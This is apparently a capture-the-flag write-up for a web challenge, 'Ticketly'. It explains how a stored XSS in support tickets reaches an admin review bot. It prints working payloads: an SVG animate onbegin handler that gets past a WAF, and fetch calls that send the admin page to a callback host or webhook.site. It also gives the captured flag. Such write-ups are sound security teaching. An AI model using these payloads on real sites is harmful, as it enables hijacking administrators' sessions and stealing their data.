# Ticketly

## Challenge info

- **Name:** Ticketly
- **Category:** Web
- **Author:** badhacker0x1

The challenge provides a ticketing application where users can create accounts, submit support tickets, and send them for administrator review.

That setup strongly suggests stored or blind XSS. The goal is to place a payload inside a ticket, wait for the administrator bot to open it, and execute JavaScript inside the administrator's authenticated session.

## First look

Two challenge instances were provided:

```text
Alternative server: http://149.102.136.203:3000/
Main server:        http://45.33.28.244:3000/
```

I started by creating an account and exploring the normal ticket workflow.

The application allowed users to:

- register and log in
- create support tickets
- view submitted tickets
- request administrator review

Since an administrator bot eventually opens submitted tickets, any stored HTML injection inside the ticket content could potentially execute with administrator privileges.

## Testing for XSS

The application had a WAF that blocked most common XSS payloads.

Straightforward payloads using elements such as `<script>` or common event handlers were rejected or filtered, so this was not a case where arbitrary HTML and JavaScript worked immediately.

I tested different HTML elements and event-based execution methods until I found that an SVG animation payload could pass the filter:

```html
<svg>
  <animate
    attributeName="x"
    dur="1s"
    onbegin="(new Image).src='http://YOUR-CALLBACK/ping?t='+Date.now()">
  </animate>
</svg>
```

The important part was the `onbegin` handler inside the SVG `<animate>` element.

This bypassed the WAF and provided a way to run JavaScript when the ticket was rendered.

## Confirming administrator-side execution

Because the payload runs inside a ticket reviewed by a bot, there is no visible browser alert or direct output.

A callback server is needed to confirm that the administrator opened the ticket and executed the payload.

I first used a small callback that only requested a `/ping` endpoint:

```html
<svg>
  <animate
    attributeName="x"
    dur="1s"
    onbegin="(new Image).src='http://YOUR-CALLBACK/ping?t='+Date.now()">
  </animate>
</svg>
```

Testing with a small request is useful because it separates two different problems:

1. Whether the XSS payload executed.
2. Whether the data-exfiltration method worked.

A missing callback does not always mean that JavaScript execution failed. The administrator bot may be unable to reach a specific callback domain, or the exfiltration request itself may be malformed or too large.

## Exfiltrating the administrator page

After finding a working SVG payload, the next step was to retrieve content visible to the administrator.

My first attempt sent the page contents through a query parameter:

```html
<svg>
  <animate
    attributeName="x"
    dur="1s"
    onbegin="fetch(location.href)
      .then(r => r.text())
      .then(d => fetch(
        'https://webhook.site/XXXXXX?d=' + encodeURIComponent(d)
      ))">
  </animate>
</svg>
```

The payload passed the WAF, but no useful callback arrived.

There were several possible reasons:

- the bot could not reach `webhook.site`
- outbound requests to common callback services were filtered
- the captured page was too large for a URL query string
- the request failed before the data was transmitted

To avoid URL-length limitations, I changed the payload to send the page through a POST body:

```html
<svg>
  <animate
    attributeName="x"
    dur="1s"
    onbegin="fetch(location.href)
      .then(r => r.text())
      .then(d => fetch('http://YOUR-CALLBACK/capture', {
        method: 'POST',
        mode: 'no-cors',
        body: d
      }))">
  </animate>
</svg>
```

I also replaced the third-party callback service with a receiver hosted on my own VPS.

The VPS listened directly on port 80. Since the Ticketly application was also served over HTTP, this avoided mixed-content issues and reduced the chance that the bot would block the destination based on its domain.

## Receiving the callback

After submitting the ticket for review, the administrator bot opened it and executed the SVG payload.

The callback contained data from:

```text
http://127.0.0.1:3000/admin/ticket/64
```

This showed that the administrator bot accessed the application locally from the challenge server.

The captured administrator data included the cookie:

```text
flag=bdsec{w4f_byp4ss3d_4dm1n_c00k13_l00t3d}
```

So the exploit chain was:

1. Submit a ticket containing the SVG payload.
2. Bypass the WAF using the `<svg><animate>` event handler.
3. Wait for the administrator bot to review the ticket.
4. Execute JavaScript in the administrator's session.
5. Send the administrator data to the VPS receiver.
6. Extract the flag from the captured cookie.

## Flag

```text
BDSEC{w4f_byp4ss3d_4dm1n_c00k13_l00t3d}
```

## Final thoughts

This was a nice stored XSS challenge with two separate obstacles.

The first was finding a payload that could get past the application's WAF. Most common XSS attempts were blocked, but an SVG animation with an `onbegin` handler was accepted and executed.

The second problem was getting data back from the administrator bot. The initial third-party callback service did not receive anything useful, but switching to a self-hosted VPS listener and sending the captured content through a POST body worked reliably.

The main lesson is that payload execution and data exfiltration should be tested separately. A missing callback does not automatically mean the XSS failed. The payload may already be running correctly while the outbound request is being blocked.
